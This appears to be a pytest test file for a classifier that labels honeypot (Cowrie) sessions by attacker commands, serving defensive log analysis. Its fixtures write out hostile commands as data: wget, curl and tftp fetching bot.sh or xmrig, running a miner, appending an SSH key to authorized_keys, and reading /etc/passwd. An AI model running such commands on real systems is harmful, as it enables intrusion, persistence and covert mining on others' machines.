"""Tests for the attack classification rules in analysis/classify.py."""
import pandas as pd
import pytest

from classify import classify_sessions, label_commands


# --- label_commands: one label per list of commands --------------------------

@pytest.mark.parametrize(
    "commands, expected",
    [
        (["cd /tmp", "./xmrig -o pool.example:3333"], "crypto-miner"),
        (["echo ssh-rsa AAAA >> ~/.ssh/authorized_keys"], "persistence"),
        (["wget http://example.com/bot.sh", "chmod +x bot.sh"], "malware download"),
        (["curl -s http://example.com/x -o /tmp/x"], "malware download"),
        (["tftp -g -r x 1.2.3.4"], "malware download"),
        (["uname -a"], "reconnaissance"),
        (["cat /proc/cpuinfo", "free -m"], "reconnaissance"),
        (["whoami"], "reconnaissance"),
        (["cat /etc/passwd"], "reconnaissance"),
        (["ls", "exit"], "other"),
        ([], "other"),
    ],
)
def test_each_rule(commands, expected):
    assert label_commands(commands) == expected


def test_miner_beats_download():
    # a miner fetched with curl is a crypto-miner, not just a download
    assert label_commands(["curl -o /tmp/xmrig http://x", "/tmp/xmrig"]) == "crypto-miner"


def test_persistence_beats_download():
    cmds = ["wget http://x/key.pub", "cat key.pub >> ~/.ssh/authorized_keys"]
    assert label_commands(cmds) == "persistence"


def test_download_beats_recon():
    assert label_commands(["uname -a", "wget http://x/bot.sh"]) == "malware download"


def test_case_insensitive():
    assert label_commands(["UNAME -A"]) == "reconnaissance"
    assert label_commands(["WGET http://x"]) == "malware download"


# --- classify_sessions: one row per session from raw events ------------------

def make_events():
    """Three sessions: a miner, a recon-only one, and one that never ran commands."""
    rows = [
        # session "miner": downloads and runs xmrig
        {"session": "miner", "src_ip": "1.1.1.1", "eventid": "cowrie.session.connect"},
        {"session": "miner", "src_ip": "1.1.1.1", "eventid": "cowrie.login.success"},
        {"session": "miner", "src_ip": "1.1.1.1", "eventid": "cowrie.command.input",
         "input": "curl -o /tmp/xmrig http://x"},
        {"session": "miner", "src_ip": "1.1.1.1", "eventid": "cowrie.command.input",
         "input": "/tmp/xmrig"},
        # session "recon": only looks around
        {"session": "recon", "src_ip": "2.2.2.2", "eventid": "cowrie.session.connect"},
        {"session": "recon", "src_ip": "2.2.2.2", "eventid": "cowrie.command.input",
         "input": "uname -a"},
        # session "scan": connects and fails to log in, no commands
        {"session": "scan", "src_ip": "3.3.3.3", "eventid": "cowrie.session.connect"},
        {"session": "scan", "src_ip": "3.3.3.3", "eventid": "cowrie.login.failed",
         "username": "root", "password": "123456"},
    ]
    return pd.DataFrame(rows)


def test_one_row_per_session_with_commands():
    sessions = classify_sessions(make_events()).set_index("session")
    # "scan" ran no commands, so it isn't classified
    assert sorted(sessions.index) == ["miner", "recon"]


def test_session_columns():
    sessions = classify_sessions(make_events()).set_index("session")

    assert sessions.loc["miner", "attack_type"] == "crypto-miner"
    assert sessions.loc["miner", "n_commands"] == 2
    assert sessions.loc["miner", "src_ip"] == "1.1.1.1"

    assert sessions.loc["recon", "attack_type"] == "reconnaissance"
    assert sessions.loc["recon", "n_commands"] == 1


def test_downloaded_counts_miner_sessions_too():
    # the miner session is labelled crypto-miner but still counts as a download
    sessions = classify_sessions(make_events()).set_index("session")
    assert bool(sessions.loc["miner", "downloaded"]) is True
    assert bool(sessions.loc["recon", "downloaded"]) is False


def test_no_commands_at_all():
    df = make_events()
    df = df[df.eventid != "cowrie.command.input"]
    assert classify_sessions(df).empty


def test_no_input_column_at_all():
    # logs where nobody ever logged in have no "input" field anywhere
    df = make_events()
    df = df[df.eventid != "cowrie.command.input"].drop(columns="input")
    assert classify_sessions(df).empty
